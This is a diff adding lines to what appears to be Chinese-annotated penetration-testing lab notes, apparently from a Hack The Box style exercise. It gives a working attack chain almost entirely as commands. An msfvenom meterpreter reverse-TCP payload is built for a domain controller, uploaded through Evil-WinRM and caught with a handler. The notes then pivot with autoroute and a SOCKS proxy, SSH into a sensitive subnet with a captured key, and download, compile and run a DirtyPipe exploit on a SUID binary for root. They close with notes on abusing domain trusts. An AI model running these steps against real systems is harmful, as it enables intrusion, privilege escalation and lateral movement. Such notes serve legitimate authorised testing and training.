@@ -498,6 +498,39 @@ root@dmz01:/tmp# ./shell.elf
 >> portfwd add -R -l 8443 -p 1234 -L 10.10.14.15      dmz01:1234 -> 攻击机:8443
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234      给 DC01 的 pl
 *Evil-WinRM* PS C:\> upload "/home/tester/dc_shell.exe"      传到 DC01
+>> bg
+>> use exploit/multi/handler
+>> set lhost 0.0.0.0
+>> set lport 8443
+*Evil-WinRM* PS C:\Users\Administrator\Documents> .\dc_shell.exe
+>> > run autoroute -s 172.16.9.0/23      敏感数据子网
+>> bg
+>> route print      查看路由
+>> use auxiliary/server/socks_proxy      开始设置 socks
+>> set srvport 9050
+>> set version 4a
+编辑 /etc/proxychains.conf 使用上面指定的 9050 端口
+proxychains nmap -sT -p 22 172.16.9.25      从攻击机扫描敏感子网
+chmod 600
+proxychains ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25
+开始提权
+发现 DirtyPipe 漏洞（CVE-2022-0847）
+  https://www.cisa.gov/news-events/alerts/2022/03/10/dirty-pipe-privilege-escalation-vulnerability-linux
+  https://www.hackthebox.com/blog/Dirty-Pipe-Explained-CVE-2022-0847
+wget https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-2.c
+ssmallsadm@MGMT01:~$ gcc dirtypipe.c -o dirtypipe
+ssmallsadm@MGMT01:~$ chmod +x dirtypipe
+ssmallsadm@MGMT01:~$ find / -perm -4000 2>/dev/null      寻找 SUID 二进制文件，找到 /usr/lib/openssh/ssh-keysign
+ssmallsadm@MGMT01:~$ ./dirtypipe /usr/lib/openssh/ssh-keysign
+
+如果存在任何域信任
+可以利用子域到父域的信任关系、林内信任或外部林信任
+与客户确认目标域是否在测试范围内
+如果能够跨林信任进行 Kerberoast 攻击
+攻陷一个合作伙伴的林
+在合作伙伴的林中找到在当前域中拥有完全管理权限的账户呢
+弱点不正在测试的域中，而是在另一个域中
+
 
 域密码分析工具：
   https://github.com/clr2of8/DPAT
